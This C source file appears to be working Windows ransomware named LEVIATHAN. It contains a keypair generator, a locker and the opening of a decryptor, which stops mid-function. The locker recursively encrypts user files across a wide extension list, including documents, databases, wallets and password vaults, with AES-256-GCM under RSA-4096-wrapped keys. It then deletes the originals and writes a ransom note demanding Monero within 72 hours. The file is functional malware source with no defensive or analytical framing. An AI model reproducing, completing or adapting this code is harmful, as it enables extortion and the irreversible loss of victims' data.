
#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#if defined(KEYGEN_BUILD) && defined(DECRYPTOR_BUILD)
#error "KEYGEN_BUILD and DECRYPTOR_BUILD are mutually exclusive — pick one."
#endif

#include <windows.h>
#include <bcrypt.h>
#include <strsafe.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#if !defined(KEYGEN_BUILD)
#include <fcntl.h>
#include <io.h>
#endif

#pragma comment(lib, "bcrypt.lib")

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

#define AES_KEY_LEN      32
#define AES_IV_LEN       12
#define AES_TAG_LEN      16
#define CHUNK_SIZE       (1024u * 1024u)
#define MAX_KEY_SLOTS    128
/* Minimum successful slot wraps before the keyring is committed.
 * With 128 loaded slots, at least 100 must wrap cleanly or the run
 * aborts with exit code 6 before touching any file. Fewer than 100
 * loaded slots: all must wrap cleanly. Fail-closed either way. */
#define MIN_SLOT_SUCCESS 100
#define RSA_PUB_BLOB_MAX 1024
#define WRAPPED_KEY_LEN  (AES_IV_LEN + AES_KEY_LEN + AES_TAG_LEN)
#define TRAILER_LEN      (AES_IV_LEN + AES_TAG_LEN + 8 + WRAPPED_KEY_LEN + 8)
#define TRAILER_MAGIC    0x4956454C4956454CULL
#define MAX_DEPTH        64
#define LEVI_EXT         L".LEVIATHAN"
#define LEVI_EXT_LEN     10
#define KEYRING_NAME     L"LEVIATHAN.keyring"
#define NOTE_NAME        L"README_LEVIATHAN.txt"
#define PRIV_BLOB_MAX    16384
#define RSA_SCRATCH_LEN  1024

/* =================================================================
 * KEYGEN BUILD
 * ================================================================= */
#if defined(KEYGEN_BUILD)

int main(void) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RSA_ALGORITHM, NULL, 0)) {
        fprintf(stderr, "[-] RSA provider open failed\n");
        return 1;
    }

    for (int i = 0; i < MAX_KEY_SLOTS; i++) {
        BCRYPT_KEY_HANDLE hKey = NULL;

        NTSTATUS st = BCryptGenerateKeyPair(hAlg, &hKey, 4096, 0);
        if (st) {
            fprintf(stderr, "[-] keypair %03d gen failed 0x%08X\n", i, (unsigned)st);
            continue;
        }
        st = BCryptFinalizeKeyPair(hKey, 0);
        if (st) {
            fprintf(stderr, "[-] finalize %03d failed 0x%08X\n", i, (unsigned)st);
            BCryptDestroyKey(hKey);
            continue;
        }

        DWORD pubLen = 0;
        st = BCryptExportKey(hKey, NULL, BCRYPT_RSAPUBLIC_BLOB, NULL, 0, &pubLen, 0);
        if (st || pubLen == 0) {
            fprintf(stderr, "[-] pub size %03d failed\n", i);
            BCryptDestroyKey(hKey);
            continue;
        }
        BYTE *pub = (BYTE *)malloc(pubLen);
        if (!pub) { BCryptDestroyKey(hKey); continue; }
        st = BCryptExportKey(hKey, NULL, BCRYPT_RSAPUBLIC_BLOB, pub, pubLen, &pubLen, 0);
        if (st) {
            fprintf(stderr, "[-] pub export %03d failed\n", i);
            free(pub); BCryptDestroyKey(hKey);
            continue;
        }

        DWORD privLen = 0;
        st = BCryptExportKey(hKey, NULL, BCRYPT_RSAPRIVATE_BLOB, NULL, 0, &privLen, 0);
        if (st || privLen == 0) {
            fprintf(stderr, "[-] priv size %03d failed\n", i);
            free(pub); BCryptDestroyKey(hKey);
            continue;
        }
        BYTE *priv = (BYTE *)malloc(privLen);
        if (!priv) { free(pub); BCryptDestroyKey(hKey); continue; }
        st = BCryptExportKey(hKey, NULL, BCRYPT_RSAPRIVATE_BLOB, priv, privLen, &privLen, 0);
        if (st) {
            fprintf(stderr, "[-] priv export %03d failed\n", i);
            free(pub); free(priv); BCryptDestroyKey(hKey);
            continue;
        }

        char p1[MAX_PATH], p2[MAX_PATH];
        if (FAILED(StringCchPrintfA(p1, MAX_PATH, "pub_%03d.bin",  i)) ||
            FAILED(StringCchPrintfA(p2, MAX_PATH, "priv_%03d.bin", i))) {
            fprintf(stderr, "[-] path build %03d failed\n", i);
            SecureZeroMemory(priv, privLen);
            free(pub); free(priv); BCryptDestroyKey(hKey);
            continue;
        }

        FILE *f1 = fopen(p1, "wb");
        if (f1) { fwrite(pub, 1, pubLen, f1); fclose(f1); }
        FILE *f2 = fopen(p2, "wb");
        if (f2) { fwrite(priv, 1, privLen, f2); fclose(f2); }

        printf("[+] slot %03d done (pub %u B, priv %u B)\n", i,
               (unsigned)pubLen, (unsigned)privLen);

        SecureZeroMemory(priv, privLen);
        free(pub);
        free(priv);
        BCryptDestroyKey(hKey);
    }

    BCryptCloseAlgorithmProvider(hAlg, 0);
    return 0;
}

/* =================================================================
 * LOCKER + DECRYPTOR (shared crypto layer)
 * ================================================================= */
#else

/* -----------------------------------------------------------------
 * GCM streaming context
 * ----------------------------------------------------------------- */
typedef struct {
    BCRYPT_ALG_HANDLE hAlg;
    BCRYPT_KEY_HANDLE hKey;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai;
    uint8_t tag[AES_TAG_LEN];
    int first;
} GCM_CTX;

static BOOL gcm_start(GCM_CTX *c, const uint8_t *key, const uint8_t *iv,
                      const uint8_t *in_tag) {
    NTSTATUS st;
    DWORD cbObj = 0, cbRes = 0;
    PUCHAR pbObj = NULL;
    memset(c, 0, sizeof(*c));

    if (BCryptOpenAlgorithmProvider(&c->hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))
        return FALSE;
    if (BCryptSetProperty(c->hAlg, BCRYPT_CHAINING_MODE,
            (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
            (ULONG)((wcslen(BCRYPT_CHAIN_MODE_GCM) + 1) * sizeof(WCHAR)), 0)) {
        BCryptCloseAlgorithmProvider(c->hAlg, 0); c->hAlg = NULL; return FALSE;
    }
    BCryptGetProperty(c->hAlg, BCRYPT_OBJECT_LENGTH,
        (PUCHAR)&cbObj, sizeof(cbObj), &cbRes, 0);
    pbObj = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, cbObj);
    if (!pbObj) { BCryptCloseAlgorithmProvider(c->hAlg, 0); c->hAlg = NULL; return FALSE; }

    st = BCryptGenerateSymmetricKey(c->hAlg, &c->hKey, pbObj, cbObj,
        (PUCHAR)key, AES_KEY_LEN, 0);
    HeapFree(GetProcessHeap(), 0, pbObj);
    if (st) { BCryptCloseAlgorithmProvider(c->hAlg, 0); c->hAlg = NULL; return FALSE; }

    BCRYPT_INIT_AUTH_MODE_INFO(c->ai);
    c->ai.pbNonce = (PUCHAR)iv;
    c->ai.cbNonce = AES_IV_LEN;
    c->ai.pbTag   = c->tag;
    c->ai.cbTag   = AES_TAG_LEN;
    if (in_tag) memcpy(c->tag, in_tag, AES_TAG_LEN);
    c->first = 1;
    return TRUE;
}

static BOOL gcm_enc_chunk(GCM_CTX *c, const uint8_t *pt, ULONG pt_len,
                          uint8_t *ct, ULONG *ct_len, BOOL final) {
    c->ai.dwFlags = final ? 0 : BCRYPT_AUTH_MODE_CHAIN_CALLS;
    NTSTATUS st = BCryptEncrypt(c->hKey, (PUCHAR)pt, pt_len, &c->ai,
                                NULL, 0, ct, pt_len, ct_len, 0);
    if (c->first) { c->ai.pbNonce = NULL; c->ai.cbNonce = 0; c->first = 0; }
    return st == STATUS_SUCCESS;
}

static BOOL gcm_dec_chunk(GCM_CTX *c, const uint8_t *ct, ULONG ct_len,
                          uint8_t *pt, ULONG *pt_len, BOOL final) {
    c->ai.dwFlags = final ? 0 : BCRYPT_AUTH_MODE_CHAIN_CALLS;
    NTSTATUS st = BCryptDecrypt(c->hKey, (PUCHAR)ct, ct_len, &c->ai,
                                NULL, 0, pt, ct_len, pt_len, 0);
    if (c->first) { c->ai.pbNonce = NULL; c->ai.cbNonce = 0; c->first = 0; }
    return st == STATUS_SUCCESS;
}

static void gcm_end(GCM_CTX *c) {
    if (c->hKey) { BCryptDestroyKey(c->hKey); c->hKey = NULL; }
    if (c->hAlg) { BCryptCloseAlgorithmProvider(c->hAlg, 0); c->hAlg = NULL; }
    SecureZeroMemory(c->tag, AES_TAG_LEN);
}

/* -----------------------------------------------------------------
 * Best-effort delete with transient-lock retry
 * ----------------------------------------------------------------- */
static void best_effort_delete(const WCHAR *path) {
    for (int attempt = 0; attempt < 5; attempt++) {
        if (DeleteFileW(path)) return;
        DWORD err = GetLastError();
        if (err != ERROR_SHARING_VIOLATION && err != ERROR_LOCK_VIOLATION &&
            err != ERROR_ACCESS_DENIED) {
            return;
        }
        Sleep(50);
    }
}

/* =================================================================
 * LOCKER-ONLY
 * ================================================================= */
#if !defined(DECRYPTOR_BUILD)

static const char *g_extensions[] = {
    ".txt",".jar",".dat",".contact",".settings",".doc",".docx",".xls",".xlsx",
    ".ppt",".pptx",".odt",".jpg",".png",".csv",".py",".sql",".mdb",".php",
    ".asp",".aspx",".html",".htm",".xml",".psd",".pdf",".dll",".cs",".mp3",
    ".mp4",".dwg",".zip",".rar",".mov",".rtf",".bmp",".mkv",".avi",".apk",
    ".lnk",".iso",".7-zip",".ace",".arj",".bz2",".cab",".gzip",".lzh",".tar",
    ".jpeg",".xz",".mpeg",".mpg",".core",".pdb",".ico",".pas",".db",".wmv",
    ".cer",".bak",".backup",".accdb",".bay",".p7c",".exif",".m4a",".wma",
    ".flv",".sie",".sum",".ibank",".wallet",".css",".js",".rb",".crt",".xlsm",
    ".xlsb",".7z",".cpp",".java",".jpe",".ini",".blob",".wps",".docm",".wav",
    ".3gp",".webm",".m4v",".amv",".m4p",".svg",".ods",".bk",".vdi",".vmdk",
    ".jsp",".json",".c",".h",".hpp",".rs",".go",".swift",".kt",".dart",".sh",
    ".bat",".cmd",".ps1",".vbs",".sqlite",".db3",".mdf",".ldf",".dbf",".fdb",
    ".pages",".numbers",".key",".epub",".mobi",".azw",".azw3",".ogg",".opus",
    ".aac",".flac",".aiff",".mid",".midi",".torrent",".pem",".pfx",".p12",
    ".ovpn",".kdbx",".kdb",".1pif",".opvault",".agilekeychain",".gpg",".pgp",
    ".asc",".wallet.dat",".dat.bak"
};
#define NUM_EXTENSIONS (sizeof(g_extensions)/sizeof(g_extensions[0]))

static BOOL has_target_ext(const char *name) {
    size_t n = strlen(name);
    for (size_t i = 0; i < NUM_EXTENSIONS; i++) {
        size_t el = strlen(g_extensions[i]);
        if (n >= el && _stricmp(name + n - el, g_extensions[i]) == 0)
            return TRUE;
    }
    return FALSE;
}

typedef struct {
    uint8_t pub[RSA_PUB_BLOB_MAX];
    DWORD   pub_len;
    DWORD   file_index;   /* original slot number from the pub_NNN.bin filename */
} KEYSLOT;

static KEYSLOT g_keyslots[MAX_KEY_SLOTS];
static DWORD    g_keyslot_count = 0;

static BOOL load_keyslots(const WCHAR *dir) {
    g_keyslot_count = 0;
    for (DWORD i = 0; i < MAX_KEY_SLOTS; i++) {
        if (g_keyslot_count >= MAX_KEY_SLOTS) break;

        WCHAR path[MAX_PATH];
        if (FAILED(StringCchPrintfW(path, MAX_PATH, L"%ls\\pub_%03lu.bin", dir,
                                    (unsigned long)i)))
            continue;

        HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (h == INVALID_HANDLE_VALUE) continue;

        DWORD sz = GetFileSize(h, NULL);
        if (sz == 0 || sz == INVALID_FILE_SIZE || sz > RSA_PUB_BLOB_MAX) {
            CloseHandle(h); continue;
        }
        DWORD rd = 0;
        if (ReadFile(h, g_keyslots[g_keyslot_count].pub, sz, &rd, NULL) && rd == sz) {
            g_keyslots[g_keyslot_count].pub_len    = rd;
            g_keyslots[g_keyslot_count].file_index = i;   /* preserve ORIGINAL slot number */
            g_keyslot_count++;
        }
        CloseHandle(h);
    }
    return g_keyslot_count > 0;
}

/* Caller must provide out buffer of at least RSA_PUB_BLOB_MAX bytes. */
static BOOL rsa_wrap_one(const uint8_t *in, DWORD in_len,
                         uint8_t *out, DWORD out_cap, DWORD *out_len,
                         const KEYSLOT *slot)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS st;
    BOOL ok = FALSE;

    if (!out || out_cap < RSA_PUB_BLOB_MAX) return FALSE;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RSA_ALGORITHM, NULL, 0))
        return FALSE;

    st = BCryptImportKeyPair(hAlg, NULL, BCRYPT_RSAPUBLIC_BLOB, &hKey,
                             (PUCHAR)slot->pub, slot->pub_len, 0);
    if (st) goto done;

    BCRYPT_OAEP_PADDING_INFO oaep = { BCRYPT_SHA256_ALGORITHM, NULL, 0 };
    ULONG outLen = 0;
    st = BCryptEncrypt(hKey, (PUCHAR)in, in_len, &oaep, NULL, 0,
                       out, out_cap, &outLen, BCRYPT_PAD_OAEP);
    if (st == STATUS_SUCCESS) { *out_len = outLen; ok = TRUE; }

done:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

static DWORD effective_slot_threshold(void) {
    return (g_keyslot_count < MIN_SLOT_SUCCESS)
        ? g_keyslot_count
        : (DWORD)MIN_SLOT_SUCCESS;
}

static BOOL write_keyring(const WCHAR *outpath, const uint8_t *sk) {
    if (GetFileAttributesW(outpath) != INVALID_FILE_ATTRIBUTES) return FALSE;

    size_t cap = 4 + (size_t)g_keyslot_count * (8 + RSA_PUB_BLOB_MAX);
    uint8_t *buf = (uint8_t *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cap);
    if (!buf) return FALSE;

    uint8_t *p = buf + 4;
    DWORD ok_count = 0;

    for (DWORD i = 0; i < g_keyslot_count; i++) {
        uint8_t wrapped[RSA_PUB_BLOB_MAX];
        DWORD wlen = 0;
        if (!rsa_wrap_one(sk, AES_KEY_LEN, wrapped, sizeof(wrapped), &wlen,
                          &g_keyslots[i])) {
            SecureZeroMemory(wrapped, sizeof(wrapped));
            continue;
        }
        if ((size_t)(p - buf) + 8 + wlen > cap) {
            SecureZeroMemory(wrapped, sizeof(wrapped));
            break;
        }
        /* Write the ORIGINAL pub_NNN.bin file index, not the array counter.
         * The decryptor uses this to load the matching priv_NNN.bin by name. */
        memcpy(p, &g_keyslots[i].file_index, 4); p += 4;
        memcpy(p, &wlen, 4);                     p += 4;
        memcpy(p, wrapped, wlen);                p += wlen;
        SecureZeroMemory(wrapped, sizeof(wrapped));
        ok_count++;
    }

    DWORD threshold = effective_slot_threshold();
    if (ok_count < threshold) {
        SecureZeroMemory(buf, cap);
        HeapFree(GetProcessHeap(), 0, buf);
        return FALSE;
    }
    memcpy(buf, &ok_count, 4);

    HANDLE h = CreateFileW(outpath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        SecureZeroMemory(buf, cap);
        HeapFree(GetProcessHeap(), 0, buf);
        return FALSE;
    }

    DWORD total = (DWORD)(p - buf);
    DWORD wr = 0;
    BOOL ok = WriteFile(h, buf, total, &wr, NULL) && wr == total;
    CloseHandle(h);
    SecureZeroMemory(buf, cap);
    HeapFree(GetProcessHeap(), 0, buf);
    return ok;
}

static BOOL wrap_file_key(const uint8_t *sk, const uint8_t *fk,
                          uint8_t out[WRAPPED_KEY_LEN])
{
    uint8_t iv[12] = {0};
    if (BCryptGenRandom(NULL, iv, 12, BCRYPT_USE_SYSTEM_PREFERRED_RNG)) {
        SecureZeroMemory(iv, sizeof(iv));
        return FALSE;
    }

    GCM_CTX ctx;
    if (!gcm_start(&ctx, sk, iv, NULL)) {
        SecureZeroMemory(iv, sizeof(iv));
        return FALSE;
    }
    ULONG ctLen = 0;
    uint8_t ct[AES_KEY_LEN];
    BOOL ok = gcm_enc_chunk(&ctx, fk, AES_KEY_LEN, ct, &ctLen, TRUE)
              && ctLen == AES_KEY_LEN;
    memcpy(out,           iv,             AES_IV_LEN);
    memcpy(out + 12,      ct,             AES_KEY_LEN);
    memcpy(out + 12 + AES_KEY_LEN, ctx.tag, AES_TAG_LEN);
    SecureZeroMemory(ct, AES_KEY_LEN);
    SecureZeroMemory(iv, sizeof(iv));
    gcm_end(&ctx);
    return ok;
}

static BOOL encrypt_file(const WCHAR *src, const uint8_t *sk) {
    WCHAR dst[MAX_PATH];
    if (FAILED(StringCchPrintfW(dst, MAX_PATH, L"%ls" LEVI_EXT, src)))
        return FALSE;
    if (GetFileAttributesW(dst) != INVALID_FILE_ATTRIBUTES) return FALSE;

    HANDLE hIn = CreateFileW(src, GENERIC_READ, FILE_SHARE_READ, NULL,
                             OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hIn == INVALID_HANDLE_VALUE) return FALSE;

    LARGE_INTEGER sz;
    if (!GetFileSizeEx(hIn, &sz) || sz.QuadPart <= 0) { CloseHandle(hIn); return FALSE; }
    uint64_t total_pt = (uint64_t)sz.QuadPart;

    WCHAR tmp[MAX_PATH];
    if (FAILED(StringCchPrintfW(tmp, MAX_PATH, L"%ls.lev_tmp", src))) {
        CloseHandle(hIn);
        return FALSE;
    }
    HANDLE hOut = CreateFileW(tmp, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                              FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) { CloseHandle(hIn); return FALSE; }

    uint8_t fk[AES_KEY_LEN] = {0}, iv_k[AES_IV_LEN] = {0};
    if (BCryptGenRandom(NULL, fk, AES_KEY_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG) ||
        BCryptGenRandom(NULL, iv_k, AES_IV_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG)) {
        CloseHandle(hIn); CloseHandle(hOut); DeleteFileW(tmp);
        SecureZeroMemory(fk, AES_KEY_LEN);
        return FALSE;
    }

    GCM_CTX ctx;
    if (!gcm_start(&ctx, fk, iv_k, NULL)) {
        CloseHandle(hIn); CloseHandle(hOut); DeleteFileW(tmp);
        SecureZeroMemory(fk, AES_KEY_LEN);
        SecureZeroMemory(iv_k, AES_IV_LEN);
        return FALSE;
    }

    uint8_t *buf_in  = (uint8_t *)malloc(CHUNK_SIZE);
    uint8_t *buf_out = (uint8_t *)malloc(CHUNK_SIZE);
    BOOL ok = (buf_in && buf_out);
    uint64_t done = 0;

    while (ok && done < total_pt) {
        DWORD want = (DWORD)((total_pt - done < CHUNK_SIZE) ? (total_pt - done) : CHUNK_SIZE);
        DWORD rd = 0;
        if (!ReadFile(hIn, buf_in, want, &rd, NULL) || rd != want) { ok = FALSE; break; }
        done += rd;
        BOOL final = (done == total_pt);
        ULONG ctLen = 0;
        if (!gcm_enc_chunk(&ctx, buf_in, rd, buf_out, &ctLen, final)) { ok = FALSE; break; }
        DWORD wr = 0;
        if (!WriteFile(hOut, buf_out, ctLen, &wr, NULL) || wr != ctLen) { ok = FALSE; break; }
    }

    if (buf_in)  { SecureZeroMemory(buf_in, CHUNK_SIZE);  free(buf_in); }
    if (buf_out) { SecureZeroMemory(buf_out, CHUNK_SIZE); free(buf_out); }

    if (ok) {
        uint8_t wrapped[WRAPPED_KEY_LEN] = {0};
        if (!wrap_file_key(sk, fk, wrapped)) {
            ok = FALSE;
        } else {
            uint8_t trailer[TRAILER_LEN] = {0};
            uint8_t *p = trailer;
            memcpy(p, iv_k,    AES_IV_LEN);  p += AES_IV_LEN;
            memcpy(p, ctx.tag, AES_TAG_LEN); p += AES_TAG_LEN;
            memcpy(p, &total_pt, 8);         p += 8;
            memcpy(p, wrapped, WRAPPED_KEY_LEN); p += WRAPPED_KEY_LEN;
            uint64_t magic = TRAILER_MAGIC;
            memcpy(p, &magic, 8);            p += 8;
            DWORD wr = 0;
            if (!WriteFile(hOut, trailer, TRAILER_LEN, &wr, NULL) || wr != TRAILER_LEN)
                ok = FALSE;
            SecureZeroMemory(trailer, sizeof(trailer));
        }
        SecureZeroMemory(wrapped, sizeof(wrapped));
    }

    gcm_end(&ctx);
    CloseHandle(hIn);
    CloseHandle(hOut);
    SecureZeroMemory(fk, AES_KEY_LEN);
    SecureZeroMemory(iv_k, AES_IV_LEN);

    if (!ok) { DeleteFileW(tmp); return FALSE; }

    if (!MoveFileExW(tmp, dst, MOVEFILE_REPLACE_EXISTING)) {
        DeleteFileW(tmp);
        return FALSE;
    }
    best_effort_delete(src);
    return TRUE;
}

static BOOL is_skip_dir(const WCHAR *name) {
    static const WCHAR *skip[] = {
        L"Windows", L"Program Files", L"Program Files (x86)",
        L"ProgramData", L"$Recycle.Bin", L"System Volume Information",
        L"boot", L"recovery", L"PerfLogs"
    };
    for (size_t i = 0; i < sizeof(skip)/sizeof(skip[0]); i++)
        if (_wcsicmp(name, skip[i]) == 0) return TRUE;
    return FALSE;
}

static void walk_and_encrypt(const WCHAR *dir, const uint8_t *sk, int depth) {
    if (depth > MAX_DEPTH) return;

    WCHAR pattern[MAX_PATH];
    if (FAILED(StringCchPrintfW(pattern, MAX_PATH, L"%ls\\*", dir))) return;

    WIN32_FIND_DATAW fd;
    HANDLE hf = FindFirstFileW(pattern, &fd);
    if (hf == INVALID_HANDLE_VALUE) return;

    do {
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
        if (_wcsicmp(fd.cFileName, NOTE_NAME) == 0) continue;
        if (_wcsicmp(fd.cFileName, KEYRING_NAME) == 0) continue;

        WCHAR full[MAX_PATH];
        if (FAILED(StringCchPrintfW(full, MAX_PATH, L"%ls\\%ls", dir, fd.cFileName)))
            continue;

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) continue;
            if (is_skip_dir(fd.cFileName)) continue;
            walk_and_encrypt(full, sk, depth + 1);
        } else {
            char name_a[MAX_PATH];
            int converted = WideCharToMultiByte(CP_ACP, 0, fd.cFileName, -1,
                                                name_a, MAX_PATH, NULL, NULL);
            if (converted == 0) continue;
            if (has_target_ext(name_a)) encrypt_file(full, sk);
        }
    } while (FindNextFileW(hf, &fd));

    FindClose(hf);
}

static void drop_note(const WCHAR *dir) {
    WCHAR path[MAX_PATH];
    if (FAILED(StringCchPrintfW(path, MAX_PATH, L"%ls\\%ls", dir, NOTE_NAME)))
        return;

    HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;

    static const char note[] =
        "===================================================\r\n"
        "  Your files have been encrypted by LEVIATHAN.\r\n"
        "===================================================\r\n"
        "\r\n"
        "Per-file keys are AES-256-GCM. A random session key\r\n"
        "protects each file key. The session key is wrapped\r\n"
        "under RSA-4096 public keys — see LEVIATHAN.keyring.\r\n"
        "\r\n"
        "To recover:\r\n"
        "  1. Do NOT modify .LEVIATHAN files or the keyring.\r\n"
        "  2. Contact: leviathan@<redacted-onion>\r\n"
        "  3. Send 3 sample ciphertexts + your keyring hash.\r\n"
        "  4. Payment in XMR. Confirmation unlocks the session.\r\n"
        "\r\n"
        "Deadline: 72 hours. After that the slots are burned.\r\n"
        "===================================================\r\n";

    DWORD wr = 0;
    WriteFile(h, note, (DWORD)strlen(note), &wr, NULL);
    CloseHandle(h);
}

int wmain(int argc, wchar_t **argv) {
    if (_setmode(_fileno(stdout), _O_U16TEXT) == -1 ||
        _setmode(_fileno(stderr), _O_U16TEXT) == -1) {
        fwprintf(stderr, L"[-] failed to set U16 console mode\n");
        return 1;
    }

    if (argc < 4) {
        fwprintf(stderr,
            L"Usage: %ls <root_dir> <keyslot_dir> <note_out_dir>\n", argv[0]);
        return 1;
    }

    const WCHAR *root    = argv[1];
    const WCHAR *keysdir = argv[2];
    const WCHAR *outdir  = argv[3];

    if (!CreateDirectoryW(outdir, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
        fwprintf(stderr, L"[-] cannot create %ls: error %lu\n",
                 outdir, (unsigned long)GetLastError());
        return 7;
    }

    if (!load_keyslots(keysdir)) {
        fwprintf(stderr, L"[-] No key slots loaded from %ls\n", keysdir);
        return 2;
    }
    wprintf(L"[+] Loaded %lu RSA-4096 slots (threshold: %lu)\n",
            (unsigned long)g_keyslot_count,
            (unsigned long)effective_slot_threshold());

    uint8_t sk[AES_KEY_LEN] = {0};
    if (BCryptGenRandom(NULL, sk, AES_KEY_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG)) {
        fwprintf(stderr, L"[-] RNG failure\n");
        return 3;
    }

    WCHAR keyring[MAX_PATH];
    if (FAILED(StringCchPrintfW(keyring, MAX_PATH, L"%ls\\%ls", root, KEYRING_NAME))) {
        SecureZeroMemory(sk, AES_KEY_LEN);
        return 4;
    }

    if (GetFileAttributesW(keyring) != INVALID_FILE_ATTRIBUTES) {
        fwprintf(stderr, L"[-] Keyring already exists: %ls — refusing to overwrite\n",
                 keyring);
        SecureZeroMemory(sk, AES_KEY_LEN);
        return 5;
    }

    if (!write_keyring(keyring, sk)) {
        fwprintf(stderr, L"[-] Failed to write keyring (threshold: %lu of %lu)\n",
                 (unsigned long)effective_slot_threshold(),
                 (unsigned long)g_keyslot_count);
        SecureZeroMemory(sk, AES_KEY_LEN);
        return 6;
    }
    wprintf(L"[+] Keyring written: %ls\n", keyring);

    wprintf(L"[+] Walking %ls\n", root);
    walk_and_encrypt(root, sk, 0);

    drop_note(root);
    drop_note(outdir);

    SecureZeroMemory(sk, AES_KEY_LEN);
    wprintf(L"[+] Done.\n");
    return 0;
}

#else  /* DECRYPTOR_BUILD */

/* Caller must provide out buffer of at least AES_KEY_LEN bytes. */
static BOOL rsa_unwrap(const uint8_t *priv_blob, DWORD priv_len,
                       const uint8_t *wrapped, DWORD wrapped_len,
                       uint8_t *out, DWORD out_cap, DWORD *out_len)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS st;
    BOOL ok = FALSE;
    uint8_t scratch[RSA_SCRATCH_LEN];

    if (!out || out_cap < AES_KEY_LEN) return FALSE;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RSA_ALGORITHM, NULL, 0))
        return FALSE;

    st = BCryptImportKeyPair(hAlg, NULL, BCRYPT_RSAPRIVATE_BLOB, &hKey,
                             (PUCHAR)priv_blob, priv_len, 0);
    if (st) goto done;

    BCRYPT_OAEP_PADDING_INFO oaep = { BCRYPT_SHA256_ALGORITHM, NULL, 0 };
    ULONG scratchLen = 0;
    st = BCryptDecrypt(hKey, (PUCHAR)wrapped, wrapped_len, &oaep, NULL, 0,
                       scratch, sizeof(scratch), &scratchLen, BCRYPT_PAD_OAEP);
    if (st != STATUS_SUCCESS) goto done;
    if (scratchLen != AES_KEY_LEN) goto done;

    memcpy(out, scratch, AES_KEY_LEN);
    *out_len = AES_KEY_LEN;
    ok = TRUE;

done:
    SecureZeroMemory(scratch, sizeof(scratch));
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

static BOOL load_priv_blob(const WCHAR *dir, DWORD slot,
                           uint8_t **out, DWORD *out_len)
{
    WCHAR p[MAX_PATH];
    if (FAILED(StringCchPrintfW(p, MAX_PATH, L"%ls\\priv_%03lu.bin", dir,
                                (unsigned long)slot)))
        return FALSE;

    HANDLE h = CreateFileW(p, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return FALSE;

    DWORD sz = GetFileSize(h, NULL);
    if (sz == 0 || sz == INVALID_FILE_SIZE || sz > PRIV_BLOB_MAX) {
        CloseHandle(h);
        return FALSE;
    }

    uint8_t *buf = (uint8_t *)malloc(sz);
    if (!buf) { CloseHandle(h); return FALSE; }

    DWORD rd = 0;
    BOOL ok = ReadFile(h, buf, sz, &rd, NULL) && rd == sz;
    CloseHandle(h);

    if (!ok) { SecureZeroMemory(buf, sz); free(buf); return FALSE; }
    *out = buf;
    *out_len = sz;
    return TRUE;
}

static BOOL recover_session_key(const WCHAR *keyring_path, const WCHAR *priv_dir,
                                uint8_t sk[AES_KEY_LEN])
{
    HANDLE h = CreateFileW(keyring_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return FALSE;

    DWORD sz = GetFileSize(h, NULL);
    if (sz == INVALID_FILE_SIZE || sz < 4 || sz > (1u << 20)) {
        CloseHandle(h);
        return FALSE;
    }

    uint8_t *buf = (uint8_t *)malloc(sz);
    DWORD rd = 0;
    if (!buf || !ReadFile(h, buf, sz, &rd, NULL) || rd != sz) {
        if (buf) { SecureZeroMemory(buf, sz); free(buf); }
        CloseHandle(h);
        return FALSE;
    }
    CloseHandle(h);

    DWORD count = 0;
    memcpy(&count, buf, 4);
    if (count == 0 || count > MAX_KEY_SLOTS) {
        SecureZeroMemory(buf, sz);
        free(buf);
        return FALSE;
    }

    uint8_t *p   = buf + 4;
    uint8_t *end = buf + sz;
    BOOL found = FALSE;

    while (p + 8 <= end) {
        DWORD slot_idx = 0, wlen = 0;
        memcpy(&slot_idx, p, 4); p += 4;   /* file_index of the pub_NNN.bin */
        memcpy(&wlen,     p, 4); p += 4;
        if (wlen == 0 || p + wlen > end) break;

        if (!found && slot_idx < MAX_KEY_SLOTS) {
            uint8_t *priv = NULL; DWORD priv_len = 0;
            if (load_priv_blob(priv_dir, slot_idx, &priv, &priv_len)) {
                DWORD outLen = 0;
